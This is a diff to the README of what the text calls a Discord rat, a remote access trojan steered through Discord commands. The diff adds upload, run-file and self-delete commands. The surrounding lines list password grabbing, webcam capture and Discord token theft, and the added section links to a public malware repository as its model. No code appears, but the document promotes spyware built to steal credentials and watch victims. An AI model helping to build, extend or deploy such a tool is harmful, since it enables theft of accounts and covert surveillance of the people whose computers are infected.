@@ -10,8 +10,15 @@ A powerful Discord rat with advanced features like screenshot capture, webcam ac
 - Grab passwords (`.grabpasswords`)
 - Take webcam picture (`.webcam`)
 - List and kill applications (`.listapps`) (`.kill ___`)
+- Upload files to computer - up to 8mb (`.upload __`)
+- Run files with path (`.run __`)
+- Delete rat off computer (`.implode`)
 - Extensively grab discord Tokens. Working with almost every browers and exe of discord. (`.grabdiscordtokens`)
 - Dynamic channel creation for multiple computers
+
+## Fyi 
+This was made with references and exemplar to the popular Pysilion-malware
+`https://github.com/mategol/PySilon-malware` 
 
 ## Setup
 1. Clone the repository:
